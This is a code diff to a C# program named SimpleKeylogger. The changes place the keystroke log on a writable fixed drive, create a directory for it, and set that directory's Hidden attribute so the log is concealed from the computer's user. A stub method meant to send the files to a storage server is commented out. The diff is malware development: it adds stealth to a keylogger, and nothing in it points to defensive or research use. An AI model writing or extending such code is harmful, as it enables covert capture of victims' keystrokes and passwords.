@@ -99,8 +99,7 @@ namespace SimpleKeylogger
                         Console.WriteLine(drive.ToString());
                         if (drive.IsReady && drive.DriveType == DriveType.Fixed && HasWriteAccess(drive.RootDirectory.FullName))
                         {
-                            string dir = string.Empty;
-                           
+                                            
                             try
                             {
                                 Directory.CreateDirectory(Path.Combine(drive.RootDirectory.FullName, targetDir));
@@ -191,8 +190,28 @@ namespace SimpleKeylogger
                     {
                         if (drive.IsReady && drive.DriveType == DriveType.Fixed && HasWriteAccess(drive.RootDirectory.FullName))
                         {
-                            Directory.CreateDirectory(drive.RootDirectory.FullName);
-                            logFilePath = Path.Combine(drive.RootDirectory.FullName, logFileName);
+                            try
+                            {
+                                Directory.CreateDirectory(Path.Combine(drive.RootDirectory.FullName, targetDir));
+                            }
+                            catch (IOException ex)
+                            {
+                                Console.WriteLine(ex);
+                            }
+
+                            logFilePath = Path.Combine(drive.RootDirectory.FullName, targetDir, logFileName);
+                            string logDirPath = Path.Combine(drive.RootDirectory.FullName, targetDir);
+                            DirectoryInfo di = new DirectoryInfo(logDirPath);
+                            if (di.Exists)
+                            {
+                                //See if directory has hidden flag, if not, make hidden
+                                if ((di.Attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
+                                {
+                                    //Add Hidden flag    
+                                    di.Attributes |= FileAttributes.Hidden;
+                                }
+                            }
+                            Console.WriteLine(logFilePath);
                             break;
                         }
                     }
@@ -217,14 +236,14 @@ namespace SimpleKeylogger
 
          static void Sendstuff()
         {
-            try
+           /* try
             {
               // Sending file to server that stores them
             }
             catch (Exception ex)
             {
                 Console.WriteLine(ex.ToString());
-            }
+            }*/
         }
 
     }
